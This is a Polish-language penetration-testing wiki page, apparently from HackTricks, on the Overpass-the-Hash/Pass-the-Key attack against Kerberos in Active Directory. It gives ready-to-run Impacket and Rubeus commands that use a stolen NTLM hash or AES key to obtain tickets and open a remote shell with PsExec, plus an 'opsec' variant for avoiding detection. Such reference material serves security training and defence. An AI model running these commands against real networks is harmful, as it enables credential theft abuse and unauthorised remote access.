# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Overpass The Hash/Pass The Key (PTK)

Atak **Overpass The Hash/Pass The Key (PTK)** jest zaprojektowany dla środowisk, w których tradycyjny protokół NTLM jest ograniczony, a uwierzytelnianie Kerberos ma pierwszeństwo. Atak ten wykorzystuje hash NTLM lub klucze AES użytkownika do pozyskiwania biletów Kerberos, co umożliwia nieautoryzowany dostęp do zasobów w sieci.

Aby przeprowadzić ten atak, pierwszym krokiem jest pozyskanie hasha NTLM lub hasła konta docelowego użytkownika. Po zabezpieczeniu tych informacji można uzyskać Ticket Granting Ticket (TGT) dla konta, co pozwala atakującemu na dostęp do usług lub maszyn, do których użytkownik ma uprawnienia.

Proces można rozpocząć za pomocą następujących poleceń:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
W przypadku scenariuszy wymagających AES256, opcja `-aesKey [AES key]` może być wykorzystana. Ponadto, uzyskany bilet może być użyty z różnymi narzędziami, w tym smbexec.py lub wmiexec.py, poszerzając zakres ataku.

Napotykanie problemów takich jak _PyAsn1Error_ lub _KDC cannot find the name_ jest zazwyczaj rozwiązywane przez aktualizację biblioteki Impacket lub użycie nazwy hosta zamiast adresu IP, zapewniając zgodność z Kerberos KDC.

Alternatywna sekwencja poleceń z użyciem Rubeus.exe demonstruje inny aspekt tej techniki:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Ta metoda odzwierciedla podejście **Pass the Key**, koncentrując się na przejęciu i wykorzystaniu biletu bezpośrednio do celów uwierzytelniania. Ważne jest, aby zauważyć, że inicjacja żądania TGT wywołuje zdarzenie `4768: A Kerberos authentication ticket (TGT) was requested`, co oznacza użycie RC4-HMAC domyślnie, chociaż nowoczesne systemy Windows preferują AES256.

Aby dostosować się do bezpieczeństwa operacyjnego i używać AES256, można zastosować następujące polecenie:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Odniesienia

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../../banners/hacktricks-training.md}}
